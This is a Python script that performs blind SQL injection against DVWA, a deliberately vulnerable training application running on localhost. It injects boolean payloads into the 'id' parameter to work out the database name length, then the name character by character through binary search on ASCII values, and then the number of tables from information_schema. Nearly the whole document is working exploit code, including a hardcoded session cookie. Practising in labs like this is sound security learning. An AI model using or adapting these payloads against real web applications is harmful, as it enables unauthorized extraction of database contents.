# DVWA Blind SQLi script

from pwn import *
import requests
import json
import re
from itertools import cycle

url = 'http://127.0.0.1/dvwa/vulnerabilities/sqli_blind'
fixed_query = "?Submit=Submit&id=1"
cookies = {
    'security': 'low',
    'PHPSESSID': 'i1hhj8fif0o91oevusi2qld4ck'
}


def sql_inject(sqli_pt1, variable, sqli_pt2):
    # Build up URL and execute SQLi
    next_url = url + fixed_query + sqli_pt1 + variable + sqli_pt2
    print("Testing " + variable + " on \"" + next_url + "\"")
    return requests.get(next_url, cookies=cookies)


def guess_len(guess_type, sqli_pt1, sqli_pt2):
    # Guess length of DB name, table count etc
    for i in range(1, 100):
        # Submit SQLi string
        response = sql_inject(sqli_pt1, str(i), sqli_pt2)
        # Extract the response we're interested in
        error_message = re.search(r'User.*\.', response.text).group(0)
        print(error_message, end='\n\n')
        # If we've found the DB name length, return
        if "MISSING" not in error_message:
            print(guess_type + str(i), end='\n\n')
            return i


def guess_db_name(db_name_len):
    db_name = ""
    for i in range(1, db_name_len + 1):
        found_next_char = 0
        # Here we only check lowercase a-z
        min_char = ord('a')
        max_char = ord('z')
        current_char = int((min_char + max_char) / 2)  # start half way through alphabet ('m')
        # Should we check greater than or less than?
        comparison_types = cycle(['<', '>'])
        comparison = next(comparison_types)

        while(found_next_char != 2):
            # Submit SQLi string ('i' used for substring index, 'current_char' used for finding next char in name)
            response = sql_inject("'+and+ascii(substr(database()," + str(i) + "," + str(i) + "))" + comparison, str(current_char), "+%23")
            # Extract the response we're interested in
            error_message = re.search(r'User.*\.', response.text).group(0)
            print(error_message, end='\n\n')

            # If ID shows "exists" then condition is true e.g. char > 97
            if "MISSING" not in error_message:
                # Reset our found_next_char counter
                found_next_char = 0
                # Next char is greater than the char we just tested
                if comparison == '>':
                    min_char = current_char
                # Otherwise, next char is lower than the one we just tested
                else:
                    max_char = current_char
                # Reset the current char to test value
                current_char = int((min_char + max_char) / 2)
            # If ID shows "MISSING" then condition is false e.g. !(char > 97)
            else:
                # Reverse the comparison check
                comparison = next(comparison_types)
                # Once this hit '2' in a row we know we've got the right value
                found_next_char += 1

        # We found our char
        db_name += chr(current_char)
        print("Found char(" + str(i) + "): " + chr(current_char), end='\n\n')
    # We got the whole DB name
    print("DB Name: " + db_name)
    return db_name


# Get the length of DB name first (pass in print output + SQLi pt1/pt2)
db_name_len = guess_len("DB Name Length: ", "'+and+length(database())+%3D", "+%23")

# Get the DB name
db_name = guess_db_name(db_name_len)

# Get number of tables in the DB
db_table_count = guess_len(
    "DB Table Count: ",
    "'+and+(select+count+(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase())%3D", "")
